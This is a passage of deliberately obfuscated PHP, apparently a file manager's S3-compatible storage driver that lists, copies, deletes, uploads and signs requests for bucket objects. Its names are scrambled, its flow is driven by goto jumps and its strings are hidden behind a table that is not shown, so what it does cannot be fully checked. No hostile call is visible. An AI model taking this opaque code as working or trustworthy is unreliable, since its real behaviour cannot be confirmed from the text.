S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($C¬´¦¬ŸÁÆ = "\x76\64") { $this->signVer = $C¬´¦¬ŸÁÆ; $this->client->setSignatureVersion($C¬´¦¬ŸÁÆ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto f ‰ğŸ±³; f ‰ğŸ±³: $FØ³‚¯ª†” =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $A££¯‰ìÔ = $this->getBucketCors(); if (!$A££¯‰ìÔ || !is_array($A££¯‰ìÔ)) { return !1; } goto eÈÕÈÇ×Ğó; eÈÕÈÇ×Ğó: if ($A££¯‰ìÔ[$FØ³‚¯ª†”[179]] != $FØ³‚¯ª†”[180] || $A££¯‰ìÔ[$FØ³‚¯ª†”[181]] != $FØ³‚¯ª†”[180]) { return !1; } $eìï¯ ¨ = array_map($FØ³‚¯ª†”[182], $A££¯‰ìÔ[$FØ³‚¯ª†”[183]]); if (!is_array($eìï¯ ¨)) { $eìï¯ ¨ = array(); } goto EÁÒ¬ÁØ†İ; EÁÒ¬ÁØ†İ: $aÁÃ¾‚Š›Ô = array($FØ³‚¯ª†”[184], $FØ³‚¯ª†”[185], $FØ³‚¯ª†”[186], $FØ³‚¯ª†”[187], $FØ³‚¯ª†”[188]); $E‘ö–áÊ“Ú = array_diff($aÁÃ¾‚Š›Ô, $eìï¯ ¨); return empty($E‘ö–áÊ“Ú); goto E…¿¤…Ï‹; E…¿¤…Ï‹: } public function mkfile($dÉÂÉ»îí, $dÄâ£í…ô = '', $eÀ„°¢˜çÎ = REPEAT_RENAME) { $C½ñŠ‚ÆÌß = $this->setContent($dÉÂÉ»îí, $dÄâ£í…ô); if ($C½ñŠ‚ÆÌß !== !1) { return $this->getPathOuter($dÉÂÉ»îí); } return !1; } public function mkdir($D®‡Ã©‹İ½, $E›÷”°ÚÍº = REPEAT_SKIP) { if (empty($D®‡Ã©‹İ½)) { return !1; } if ($this->_isFolder($D®‡Ã©‹İ½)) { return $this->getPathOuter($D®‡Ã©‹İ½); } $e‹îáÊÍ = $this->setContent($D®‡Ã©‹İ½, $_SERVER[ÈİÅ¿ÈÈ¥×][33], !0); if ($e‹îáÊÍ !== !1) { return $this->getPathOuter($D®‡Ã©‹İ½); } return !1; } public function copyFile($fÉÖ¯Ó¬ğ›, $E„é½…Äöš, $Fº–À³í = array()) { $Cóƒ¸åÍ“ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bƒ÷Ò¹øİè = $this->objectMeta($fÉÖ¯Ó¬ğ›); if (!$bƒ÷Ò¹øİè) { return !1; } if ($bƒ÷Ò¹øİè[$Cóƒ¸åÍ“[77]] <= 1024 * 1024 * 200) { $CÚ‰À¢²µÏ = $this->client->copyObject($this->bucket, $fÉÖ¯Ó¬ğ›, $this->bucket, $E„é½…Äöš, $Cóƒ¸åÍ“[189], $Fº–À³í); } else { $CÚ‰À¢²µÏ = $this->client->multiCopyObject($this->bucket, $fÉÖ¯Ó¬ğ›, $this->bucket, $E„é½…Äöš, $Fº–À³í); } $CÚ‰À¢²µÏ = $CÚ‰À¢²µÏ ? $this->getPathOuter($E„é½…Äöš) : !1; return $CÚ‰À¢²µÏ; } public function moveFile($c‚õ²™¿¼, $A”ÊÆì—Œš) { if ($this->copyFile($c‚õ²™¿¼, $A”ÊÆì—Œš)) { $this->delFile($c‚õ²™¿¼); return $this->getPathOuter($A”ÊÆì—Œš); } return !1; } public function delFile($e›Ù³ÁÔâ) { return $this->client->deleteObject($this->bucket, $e›Ù³ÁÔâ); } public function delFolder($DØ“‰¡ŞÙ™) { goto E„¬¦ö‡ó; f·æŒß©È: return $this->delByBatch($d±ì¸‰à¯á[$FŸº««Ô–Ê[74]]); goto f¨šß‹ÏŸ; E„¬¦ö‡ó: $FŸº««Ô–Ê =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if (!$this->exist($DØ“‰¡ŞÙ™)) { return !0; } $this->listItemCache = !1; goto cŒÛ—ÖÉ†; cŒÛ—ÖÉ†: $d±ì¸‰à¯á = $this->fileList($DØ“‰¡ŞÙ™); $this->listItemCache = !0; $E„ÍíÔ¡Œ = trim($DØ“‰¡ŞÙ™, $FŸº««Ô–Ê[8]) . $FŸº««Ô–Ê[8]; goto DŠ…ŞêáÃ; DŠ…ŞêáÃ: if (!empty($DØ“‰¡ŞÙ™) && !in_array($E„ÍíÔ¡Œ, $d±ì¸‰à¯á[$FŸº««Ô–Ê[74]])) { $d±ì¸‰à¯á[$FŸº««Ô–Ê[74]][] = $E„ÍíÔ¡Œ; } $dÍ–Ğõáîö = $this->delByBatch($d±ì¸‰à¯á[$FŸº««Ô–Ê[73]]); if (!$dÍ–Ğõáîö) { return !1; } goto f·æŒß©È; f¨šß‹ÏŸ: } private function delByBatch($aßŸÓ­“Äê) { foreach (array_chunk($aßŸÓ­“Äê, 1000) as $CñÂöÁÉî®) { $dÌÔ„ƒ¡ÑÒ = $this->client->deleteObjects($this->bucket, $CñÂöÁÉî®); if (!$dÌÔ„ƒ¡ÑÒ) { return !1; } } return !0; } public function rename($D¡—ã¤ÉÍ´, $eãÒ…×Ê•ë) { return $this->renameObject($D¡—ã¤ÉÍ´, $eãÒ…×Ê•ë); } public function listPath($E‡ÈâÕï¶Ô, $d —ÁšàÁç = false) { $cŸ……¶ª‹Â =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $f½Ó ÀêÖ = $this->fileList($E‡ÈâÕï¶Ô, $cŸ……¶ª‹Â[8], !0); foreach ($f½Ó ÀêÖ[$cŸ……¶ª‹Â[74]] as $cùîÇä†ğš => $Fƒ‚Ò‚º¸À) { $f½Ó ÀêÖ[$cŸ……¶ª‹Â[74]][$cùîÇä†ğš] = $this->folderInfo($Fƒ‚Ò‚º¸À, $d —ÁšàÁç); } foreach ($f½Ó ÀêÖ[$cŸ……¶ª‹Â[73]] as $cùîÇä†ğš => $Fƒ‚Ò‚º¸À) { $f½Ó ÀêÖ[$cŸ……¶ª‹Â[73]][$cùîÇä†ğš] = $this->fileInfo($Fƒ‚Ò‚º¸À[$cŸ……¶ª‹Â[28]], $d —ÁšàÁç, $Fƒ‚Ò‚º¸À); } return $f½Ó ÀêÖ; } private function fileInfo($D ƒÜßá”Ê, $A­ã…Û°©Ü = false, $a¯Œ£–Ìµù = array()) { goto bÇÂÎÀåÈ¯; CªÑÒ±ãé›: if (isset($a¯Œ£–Ìµù[$Bù¢‡á®‹Ô[193]])) { $CÖÌçåŒóä[$Bù¢‡á®‹Ô[107]] = $a¯Œ£–Ìµù[$Bù¢‡á®‹Ô[193]]; } if (isset($a¯Œ£–Ìµù[$Bù¢‡á®‹Ô[77]])) { $CÖÌçåŒóä[$Bù¢‡á®‹Ô[77]] = $a¯Œ£–Ìµù[$Bù¢‡á®‹Ô[77]]; } return $CÖÌçåŒóä; goto dÌÖõ°…¼½; CÅàç–¿ì: $CÖÌçåŒóä[$Bù¢‡á®‹Ô[190]] = $CÖÌçåŒóä[$Bù¢‡á®‹Ô[107]] = 0; $CÖÌçåŒóä[$Bù¢‡á®‹Ô[191]] = $CÖÌçåŒóä[$Bù¢‡á®‹Ô[192]] = !0; if (empty($a¯Œ£–Ìµù)) { $a¯Œ£–Ìµù = $this->objectMeta($D ƒÜßá”Ê); if (!$a¯Œ£–Ìµù) { return $CÖÌçåŒóä; } } goto CªÑÒ±ãé›; bÇÂÎÀåÈ¯: $Bù¢‡á®‹Ô =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $CÖÌçåŒóä = array($Bù¢‡á®‹Ô[28] => $this->pathThis($D ƒÜßá”Ê), $Bù¢‡á®‹Ô[75] => $this->getPathOuter($D ƒÜßá”Ê), $Bù¢‡á®‹Ô[29] => $Bù¢‡á®‹Ô[171], $Bù¢‡á®‹Ô[165] => $this->ext($D ƒÜßá”Ê), $Bù¢‡á®‹Ô[77] => isset($a¯Œ£–Ìµù[$Bù¢‡á®‹Ô[77]]) ? $a¯Œ£–Ìµù[$Bù¢‡á®‹Ô[77]] : 0); if ($A­ã…Û°©Ü) { return $CÖÌçåŒóä; } goto CÅàç–¿ì; dÌÖõ°…¼½: } private function folderInfo($F˜ˆ±œŒ£õ, $A«ùĞ´Ä¬¡ = false) { goto E‰…Ş¶áØÖ; E‰…Ş¶áØÖ: $dˆáÃ‰˜‘ˆ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Dğ©™·Îî = array($dˆáÃ‰˜‘ˆ[28] => $this->pathThis($F˜ˆ±œŒ£õ), $dˆáÃ‰˜‘ˆ[75] => $this->getPathOuter($dˆáÃ‰˜‘ˆ[8] . $F˜ˆ±œŒ£õ), $dˆáÃ‰˜‘ˆ[29] => $dˆáÃ‰˜‘ˆ[76]); if ($A«ùĞ´Ä¬¡) { return $Dğ©™·Îî; } goto a¥³·«ñË†; aê­’ëÆÉã: $F˜ˆ±œŒ£õ = trim($F˜ˆ±œŒ£õ, $dˆáÃ‰˜‘ˆ[8]) . $dˆáÃ‰˜‘ˆ[8]; $E£¸´˜æÄ» = $this->objectMeta($F˜ˆ±œŒ£õ); if (isset($E£¸´˜æÄ»[$dˆáÃ‰˜‘ˆ[193]])) { $Dğ©™·Îî[$dˆáÃ‰˜‘ˆ[190]] = $E£¸´˜æÄ»[$dˆáÃ‰˜‘ˆ[193]]; } goto b´±ëÜ´µğ; a¥³·«ñË†: $Dğ©™·Îî[$dˆáÃ‰˜‘ˆ[190]] = $Dğ©™·Îî[$dˆáÃ‰˜‘ˆ[107]] = 0; $Dğ©™·Îî[$dˆáÃ‰˜‘ˆ[191]] = $Dğ©™·Îî[$dˆáÃ‰˜‘ˆ[192]] = !0; if ($F˜ˆ±œŒ£õ == $dˆáÃ‰˜‘ˆ[33]) { return $Dğ©™·Îî; } goto aê­’ëÆÉã; b´±ëÜ´µğ: return $Dğ©™·Îî; goto b½ó‹º‡ã‹; b½ó‹º‡ã‹: } private function fileList($CÈÌ”‹£éŒ, $bóªÑàù® = '', $DêåæÔàæ¶ = 0) { goto CËÀ¿Ğ¯Öù; bÈÑæÜ›íÓ: foreach ($c®Ó›Ø‰Ù”[$B±¾‚‰é¥•[194]] as $eËÑÔ³—À‰) { goto d½£Ä®³º; d½£Ä®³º: $fóƒµ²æòå = $eËÑÔ³—À‰[$B±¾‚‰é¥•[28]]; if ($fóƒµ²æòå == $bâÍÇÇ¾š) { continue; } $A·Öˆ¿·¼ = isset($eËÑÔ³—À‰[$B±¾‚‰é¥•[77]]) ? $eËÑÔ³—À‰[$B±¾‚‰é¥•[77]] : 0; goto D¯¤„ŞÁƒ’; D¯¤„ŞÁƒ’: $e×”‹ … = $A·Öˆ¿·¼ == 0 && substr($fóƒµ²æòå, strlen($fóƒµ²æòå) - 1, 1) == $B±¾‚‰é¥•[8] ? !0 : !1; if ($Dí«¬ç¡³) { $this->cacheMethod($B±¾‚‰é¥•[195], $fóƒµ²æòå, $e×”‹ …); $this->cacheMethod($B±¾‚‰é¥•[196], $fóƒµ²æòå, $eËÑÔ³—À‰); } if ($e×”‹ …) { $b–ğÖ£´Ö„[] = $fóƒµ²æòå; continue; } goto eÈ¤ºÌğâœ; eÈ¤ºÌğâœ: $AøÂéàñæ[] = $DêåæÔàæ¶ ? $eËÑÔ³—À‰ : $fóƒµ²æòå; goto Bæ±°‹¡òĞ; Bæ±°‹¡òĞ: } foreach ($c®Ó›Ø‰Ù”[$B±¾‚‰é¥•[197]] as $eËÑÔ³—À‰) { $b–ğÖ£´Ö„[] = $eËÑÔ³—À‰[$B±¾‚‰é¥•[28]]; if ($Dí«¬ç¡³) { $this->cacheMethod($B±¾‚‰é¥•[195], $eËÑÔ³—À‰[$B±¾‚‰é¥•[28]], !0); } } if ($Dí«¬ç¡³) { $this->cacheMethod($B±¾‚‰é¥•[195], $CÈÌ”‹£éŒ, !0); } goto dª‘ˆãÜÏ; dª‘ˆãÜÏ: return array($B±¾‚‰é¥•[74] => $b–ğÖ£´Ö„, $B±¾‚‰é¥•[73] => $AøÂéàñæ); goto E¸´÷òÕšœ; CËÀ¿Ğ¯Öù: $B±¾‚‰é¥• =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bâÍÇÇ¾š = rtrim($CÈÌ”‹£éŒ, $B±¾‚‰é¥•[8]) . $B±¾‚‰é¥•[8]; $c®Ó›Ø‰Ù” = $this->listObjs($bâÍÇÇ¾š, null, null, $bóªÑàù®); goto Cö¨Œ±Õª; Cö¨Œ±Õª: if (!$c®Ó›Ø‰Ù”) { return array($B±¾‚‰é¥•[74] => array(), $B±¾‚‰é¥•[73] => array()); } $Dí«¬ç¡³ = $this->listItemCache === !1 ? !1 : !0; $b–ğÖ£´Ö„ = $AøÂéàñæ = array(); goto bÈÑæÜ›íÓ; E¸´÷òÕšœ: } private function listObjs($B‡²ì°£‚Ÿ, $dÚë–»ƒ¯„ = null, $B¼åå¤ˆ÷Ù = null, $CğœÁ±†˜£ = null) { $bßÄ±œèå¥ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $B‡²ì°£‚Ÿ = trim($B‡²ì°£‚Ÿ, $bßÄ±œèå¥[8]); $E¼‚½¥ŸŠ» = empty($B‡²ì°£‚Ÿ) ? $bßÄ±œèå¥[33] : $B‡²ì°£‚Ÿ . $bßÄ±œèå¥[8]; return $this->client->getBucket($this->bucket, $E¼‚½¥ŸŠ», $dÚë–»ƒ¯„, $B¼åå¤ˆ÷Ù, $CğœÁ±†˜£, !0); } public function has($DÚ±ÀŒŠ¼, $D×ç¹‡‡µñ = false, $e˜‘ğÂŸ¼¨ = true) { goto AëÖ³ñ¬; AëÖ³ñ¬: $EçâÀˆ×§Ô =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $DÚ±ÀŒŠ¼ = trim($DÚ±ÀŒŠ¼, $EçâÀˆ×§Ô[8]); $f¡êô«°Í = empty($DÚ±ÀŒŠ¼) ? $EçâÀˆ×§Ô[33] : $DÚ±ÀŒŠ¼ . $EçâÀˆ×§Ô[8]; goto CàÕ‹Æ¿†í; CçŸ¹ÁªØİ: return !1; goto Eé¯™—”Ñ; CàÕ‹Æ¿†í: $c†Î½ÁÖ… = null; $C…—ˆ¬‘½¤ = 500; $c—§éâ±¹« = $EçâÀˆ×§Ô[8]; goto e‡©ÕŸæ‚; e‡©ÕŸæ‚: $DšñõÅƒù = $EÀ†·œÒğ§ = array(); while (!0) { $FÖË¤ï”«í = $this->listObjs($DÚ±ÀŒŠ¼, $c†Î½ÁÖ…, $C…—ˆ¬‘½¤, $c—§éâ±¹«); if (!$FÖË¤ï”«í) { break; } $c†Î½ÁÖ… = $FÖË¤ï”«í[$EçâÀˆ×§Ô[198]]; $dÜ‡‹ š÷Õ = $FÖË¤ï”«í[$EçâÀˆ×§Ô[194]]; $Cï²‰‘öé = $FÖË¤ï”«í[$EçâÀˆ×§Ô[197]]; if (empty($dÜ‡‹ š÷Õ) && empty($Cï²‰‘öé)) { break; } if (count($dÜ‡‹ š÷Õ) == 1 && $dÜ‡‹ š÷Õ[0][$EçâÀˆ×§Ô[28]] == $f¡êô«°Í) { break; } if ($D×ç¹‡‡µñ) { if (count($dÜ‡‹ š÷Õ)) { $dÜ‡‹ š÷Õ = array_column($dÜ‡‹ š÷Õ, $EçâÀˆ×§Ô[28]); $DšñõÅƒù = array_merge($DšñõÅƒù, $dÜ‡‹ š÷Õ); } if (count($Cï²‰‘öé)) { $Cï²‰‘öé = array_column($Cï²‰‘öé, $EçâÀˆ×§Ô[28]); $EÀ†·œÒğ§ = array_merge($EÀ†·œÒğ§, $Cï²‰‘öé); } if ($c†Î½ÁÖ… === null) { break; } continue; } if ($e˜‘ğÂŸ¼¨) { if (!empty($dÜ‡‹ š÷Õ)) { if (count($dÜ‡‹ š÷Õ) > 1 || isset($dÜ‡‹ š÷Õ[0][$EçâÀˆ×§Ô[28]]) && $dÜ‡‹ š÷Õ[0][$EçâÀˆ×§Ô[28]] != $f¡êô«°Í) { return !0; } } } else { if (!empty($Cï²‰‘öé)) { return !0; } } if ($c†Î½ÁÖ… === null) { break; } } if ($D×ç¹‡‡µñ) { $DšñõÅƒù = array_diff($DšñõÅƒù, array($f¡êô«°Í)); $DšñõÅƒù = count(array_unique($DšñõÅƒù)); $EÀ†·œÒğ§ = count(array_unique($EÀ†·œÒğ§)); return array($EçâÀˆ×§Ô[199] => $DšñõÅƒù, $EçâÀˆ×§Ô[200] => $EÀ†·œÒğ§); } goto CçŸ¹ÁªØİ; Eé¯™—”Ñ: } public function listAll($E¡ŠÓ­¾˜”) { $FÉ’„á£“® =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eèˆÕî‚Üé = $this->fileList($E¡ŠÓ­¾˜”, $FÉ’„á£“®[33], !0); $CÈ®†¬Ìñ« = array(); foreach ($eèˆÕî‚Üé[$FÉ’„á£“®[73]] as $Aà³ğ›Ï×) { $CÈ®†¬Ìñ«[$Aà³ğ›Ï×[$FÉ’„á£“®[28]]] = $Aà³ğ›Ï×[$FÉ’„á£“®[77]]; } foreach ($eèˆÕî‚Üé[$FÉ’„á£“®[74]] as $Aà³ğ›Ï×) { if (is_string($Aà³ğ›Ï×)) { $CÈ®†¬Ìñ«[$Aà³ğ›Ï×] = 0; } } return $this->listAllFiles($E¡ŠÓ­¾˜”, array_keys($CÈ®†¬Ìñ«), $CÈ®†¬Ìñ«); } public function canRead($c¹ŒØŒáíĞ) { $B£ë«‘„¹á =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $FÆàÚø¢ = $this->client->getAccessControlPolicy($this->bucket, $c¹ŒØŒáíĞ); if (!$FÆàÚø¢) { return !1; } return in_array($FÆàÚø¢, array($B£ë«‘„¹á[201], $B£ë«‘„¹á[202], $B£ë«‘„¹á[203])) ? !0 : !1; } public function canWrite($aöĞÉ¤Ë¥Û) { $DÌ¶Ğãİ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $B¦ÆÂ¬Şæ = $this->client->getAccessControlPolicy($this->bucket, $aöĞÉ¤Ë¥Û); if (!$B¦ÆÂ¬Şæ) { return !1; } return in_array($B¦ÆÂ¬Şæ, array($DÌ¶Ğãİ[201], $DÌ¶Ğãİ[202])) ? !0 : !1; } public function getContent($dÈ“÷—âÖ) { return $this->client->getObject($this->bucket, $dÈ“÷—âÖ); } public function setContent($eÚ¶ƒëÍ’Ü, $fˆ›ƒò¯¯¨ = '', $E˜Ïî³†Ã¡ = false) { goto EäÔù©ÏÒ”; EäÔù©ÏÒ”: $Dª•—ğÄê =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $eÚ¶ƒëÍ’Ü = $E˜Ïî³†Ã¡ ? trim($eÚ¶ƒëÍ’Ü, $Dª•—ğÄê[8]) . $Dª•—ğÄê[8] : $eÚ¶ƒëÍ’Ü; $aŒÜŒÏ®ƒˆ = get_file_mime(get_path_ext($eÚ¶ƒëÍ’Ü)); goto C›’Š¬–• ; C›’Š¬–• : $f¯§›Ó‡¬¢ = $this->client->putObject($fˆ›ƒò¯¯¨, $this->bucket, $eÚ¶ƒëÍ’Ü, $Dª•—ğÄê[189], array(), $aŒÜŒÏ®ƒˆ); if (!$f¯§›Ó‡¬¢) { return !1; } if ($E˜Ïî³†Ã¡) { return !0; } goto B„…Õ‰°Ã†; B„…Õ‰°Ã†: $this->cacheMethod(null, null); $f¯§›Ó‡¬¢ = $this->copyFile($eÚ¶ƒëÍ’Ü, $eÚ¶ƒëÍ’Ü, array($Dª•—ğÄê[204] => $f¯§›Ó‡¬¢[$Dª•—ğÄê[205]])); return $f¯§›Ó‡¬¢ ? !0 : !1; goto b££Ş²˜¨; b££Ş²˜¨: } public function fileSubstr($eïï ÖÔ”², $C…˜ÏïÊÉ¸, $BÜâ¢ó¥¦…) { $F©²Ÿ—ÔÅ = $C…˜ÏïÊÉ¸ + $BÜâ¢ó¥¦… - 1; return $this->client->getObject($this->bucket, $eïï ÖÔ”², array($_SERVER[ÈİÅ¿ÈÈ¥×][206] => "\x62\x79\164\x65\163\75{$C…˜ÏïÊÉ¸}\x2d{$F©²Ÿ—ÔÅ}")); } public function upload($Eâòåğ‰ˆ’, $A©²ŞİÂŞ–, $fÇ†ƒÑº« = false, $Aä©ô›…Öó = REPEAT_REPLACE) { $F“÷”˜Î =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $bãÊ”ôƒÀ = array($F“÷”˜Î[204] => @md5_file($A©²ŞİÂŞ–)); $aÌ˜ñºªÙ… = array($F“÷”˜Î[207] => get_file_mime(get_path_ext($Eâòåğ‰ˆ’))); if (IO::size($A©²ŞİÂŞ–) <= 1024 * 1024 * 200) { $dÍéÖé±ã = $this->client->putObjectFile($A©²ŞİÂŞ–, $this->bucket, $Eâòåğ‰ˆ’, $F“÷”˜Î[189], $bãÊ”ôƒÀ, $aÌ˜ñºªÙ…); return !empty($dÍéÖé±ã) ? $this->getPathOuter($Eâòåğ‰ˆ’) : !1; } $F‘»š×ˆ§ = $this->client->multiUploadObject($A©²ŞİÂŞ–, $this->bucket, trim($Eâòåğ‰ˆ’, $F“÷”˜Î[8]), $bãÊ”ôƒÀ, $aÌ˜ñºªÙ…); return $F‘»š×ˆ§ ? $this->getPathOuter($Eâòåğ‰ˆ’) : !1; } public function download($bŠ”ïáë†Ö, $cõƒÜ„©¨‘) { if (!@is_dir($this->pathFather($cõƒÜ„©¨‘)) && !IO::mkdir($this->pathFather($cõƒÜ„©¨‘))) { return !1; } $fÇÅ×’Á = $this->client->getObject($this->bucket, $bŠ”ïáë†Ö, array(), $cõƒÜ„©¨‘); return $fÇÅ×’Á !== !1 ? $cõƒÜ„©¨‘ : !1; } public function link($b¹÷À„‘É, $e³È›˜ñŒ = array()) { $aƒ¯ëŠÏŒå =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($this->signVer == $aƒ¯ëŠÏŒå[208]) { return $this->client->getAuthenticatedURL($this->bucket, $b¹÷À„‘É, 3600 * 12, $e³È›˜ñŒ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($b¹÷À„‘É, $aƒ¯ëŠÏŒå[8]), 3600 * 12, $this->region, array(), !0, $e³È›˜ñŒ); } public function fileOut($Cöç£¾—‚ñ, $fË•¹°¯¡Ü = false, $DœÁ»å…Ù = false, $E•àˆãÅ—Î = '') { goto DëÕãÃÓÔÓ; E§ÏĞòšŞÍ: $FŸÃÕêé‰Ø = get_file_mime(get_path_ext($DœÁ»å…Ù)); if ($FŸÃÕêé‰Ø == $EÛ‰Šğå×’[209]) { return parent::fileOut($Cöç£¾—‚ñ, $fË•¹°¯¡Ü, $DœÁ»å…Ù, $E•àˆãÅ—Î); } $fË•¹°¯¡Ü = $fË•¹°¯¡Ü ? $EÛ‰Šğå×’[210] : $EÛ‰Šğå×’[211]; goto b½ó¢Š’Ñá; DëÕãÃÓÔÓ: $EÛ‰Šğå×’ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; if ($this->isFileOutServer()) { return $this->fileOutServer($Cöç£¾—‚ñ, $fË•¹°¯¡Ü, $DœÁ»å…Ù, $E•àˆãÅ—Î); } if (!$DœÁ»å…Ù) { $DœÁ»å…Ù = $this->pathThis($Cöç£¾—‚ñ); } goto E§ÏĞòšŞÍ; b½ó¢Š’Ñá: $C‘÷£µá…Œ = array($EÛ‰Šğå×’[212] => $fË•¹°¯¡Ü . $EÛ‰Šğå×’[213] . rawurlencode($DœÁ»å…Ù), $EÛ‰Šğå×’[214] => $FŸÃÕêé‰Ø); $EÅÏöµæ†Ó = $this->link($Cöç£¾—‚ñ, $C‘÷£µá…Œ); $this->fileOutLink($EÅÏöµæ†Ó); goto A¢Ğ¡Ñó®; A¢Ğ¡Ñó®: } public function fileOutServer($B°‹ÂŸëÙ, $E¤¢™âøğ = false, $EëïÌœã‰î = false, $bÚ±©É¢ = '') { parent::fileOut($B°‹ÂŸëÙ, $E¤¢™âøğ, $EëïÌœã‰î, $bÚ±©É¢); } public function fileOutImageServer($aÊÎÉÛŸ¸, $DãâŸÅÇ¥õ = 250) { parent::fileOutImage($aÊÎÉÛŸ¸, $DãâŸÅÇ¥õ); } public function hashMd5($aÉ©Õ§ÄñÄ, $dŠ³—ÏŒÆÈ = '') { $EôÓĞãö‡å =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $dÌË’—Öˆ = $this->objectMeta($aÉ©Õ§ÄñÄ); if (!$dÌË’—Öˆ) { return !1; } $dŠ³—ÏŒÆÈ = $dŠ³—ÏŒÆÈ ? $dŠ³—ÏŒÆÈ : _get($dÌË’—Öˆ, $EôÓĞãö‡å[215]); $dŠ³—ÏŒÆÈ = $dŠ³—ÏŒÆÈ ? $dŠ³—ÏŒÆÈ : _get($dÌË’—Öˆ, $EôÓĞãö‡å[205], $EôÓĞãö‡å[33]); return $dŠ³—ÏŒÆÈ; } public function uploadFormData($EÛ¿ÇèŒ³¯, $c¦•²°¯— = 3600) { $F…ª®“‡à =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $b½ŸÍÚ¿æ³ = $this->pathFather($EÛ¿ÇèŒ³¯); $fÊ¯êèá¬ƒ = $this->client->getHttpUploadPostParams($this->bucket, $b½ŸÍÚ¿æ³, $F…ª®“‡à[189], $c¦•²°¯—); return array_merge((array) $fÊ¯êèá¬ƒ, array($F…ª®“‡à[173] => $this->getHost())); } public function multiUploadFormData($Eäèè‡»ğ, $eº‹‘°‘Ğ = 3600) { $Cù§ò¢Ú§ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $Bèƒæ­‹Óá = gmdate($Cù§ò¢Ú§[216]); $bëæ¼¿Úïö = array(); $aàëôŠÌÛ„ = $this->client->getUploadId($this->bucket, $Eäèè‡»ğ, $bëæ¼¿Úïö); if (!$aàëôŠÌÛ„) { return !1; } return array($Cù§ò¢Ú§[217] => $aàëôŠÌÛ„, $Cù§ò¢Ú§[173] => $this->getHost() . $Cù§ò¢Ú§[8] . $this->pathEncode($Eäèè‡»ğ), $Cù§ò¢Ú§[218] => $Bèƒæ­‹Óá, $Cù§ò¢Ú§[89] => $Eäèè‡»ğ); } public function multiUploadAuthData($Cœô¿Á·Í•, $B•†˜à××Ş = array()) { goto F‚³ƒğÁ†; aêÇ®á„: $B—÷‹Ş‘Œ = $B•†˜à××Ş[$d¡‚÷‹ÎÛÁ[89]]; unset($B•†˜à××Ş[$d¡‚÷‹ÎÛÁ[89]]); if (isset($B•†˜à××Ş[$d¡‚÷‹ÎÛÁ[219]])) { $B•†˜à××Ş[$d¡‚÷‹ÎÛÁ[218]] = $fõãÂ½÷µâ; return $this->listUploadParts($B—÷‹Ş‘Œ, $B•†˜à××Ş); } goto FÜÛª»³; bÊ«Ñª‡ğ: $Aµ¹³†Ê¥‹ = implode($d¡‚÷‹ÎÛÁ[225], $FŒÓìò¡Ş”); $e­¦«ºŞ§ = base64_encode(hash_hmac($d¡‚÷‹ÎÛÁ[226], $Aµ¹³†Ê¥‹, $this->secret, !0)); $bÃ¶ÛÇ‡µ = $d¡‚÷‹ÎÛÁ[227] . $this->accessKey . $d¡‚÷‹ÎÛÁ[4] . $e­¦«ºŞ§; goto CßÏä‘±; CßÏä‘±: if (strpos($d©éÜ»äíô, $d¡‚÷‹ÎÛÁ[221]) === 0) { return array($d¡‚÷‹ÎÛÁ[228] => $bÃ¶ÛÇ‡µ, $d¡‚÷‹ÎÛÁ[218] => $fõãÂ½÷µâ); } return $bÃ¶ÛÇ‡µ; goto D›„æîô; FÜÛª»³: $FŒÓìò¡Ş” = array($d¡‚÷‹ÎÛÁ[220], $d¡‚÷‹ÎÛÁ[33], $d¡‚÷‹ÎÛÁ[116], $d¡‚÷‹ÎÛÁ[33], "\170\x2d\x61\155\172\x2d\144\x61\x74\x65\x3a{$fõãÂ½÷µâ}", $d¡‚÷‹ÎÛÁ[8] . $this->bucket . $d¡‚÷‹ÎÛÁ[8] . $this->pathEncode($B—÷‹Ş‘Œ) . $d©éÜ»äíô); if (strpos($d©éÜ»äíô, $d¡‚÷‹ÎÛÁ[221]) === 0) { $FŒÓìò¡Ş”[0] = $d¡‚÷‹ÎÛÁ[222]; } if (isset($B•†˜à××Ş[$d¡‚÷‹ÎÛÁ[223]]) && $B•†˜à××Ş[$d¡‚÷‹ÎÛÁ[223]] == $d¡‚÷‹ÎÛÁ[224]) { $FŒÓìò¡Ş”[0] = $d¡‚÷‹ÎÛÁ[224]; } goto bÊ«Ñª‡ğ; F‚³ƒğÁ†: $d¡‚÷‹ÎÛÁ =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $fõãÂ½÷µâ = isset($B•†˜à××Ş[$d¡‚÷‹ÎÛÁ[218]]) ? $B•†˜à××Ş[$d¡‚÷‹ÎÛÁ[218]] : gmdate($d¡‚÷‹ÎÛÁ[216]); $d©éÜ»äíô = isset($B•†˜à××Ş[$d¡‚÷‹ÎÛÁ[165]]) ? $B•†˜à××Ş[$d¡‚÷‹ÎÛÁ[165]] : $d¡‚÷‹ÎÛÁ[33]; goto aêÇ®á„; D›„æîô: } public function listUploadParts($bÇšğ„Ş, $DÏŒ‡Ñõ©  = array()) { goto aì‡¹Û²º—; aì‡¹Û²º—: $fÛÉÎÖ÷È =& $_SERVER[ÈİÅ¿ÈÈ¥×]; $DÀ÷Äæù« = str_replace($fÛÉÎÖ÷È[229], $fÛÉÎÖ÷È[33], $DÏŒ‡Ñõ© [$fÛÉÎÖ÷È[165]]); $añÌ­ÕØÛÈ = $this->client->listParts($this->bucket, $bÇšğ„Ş, $DÀ÷Äæù«); goto C†öŠÂ¤”‰; c¸Œ‰µ¨ê: $CƒÒ…¦ à = 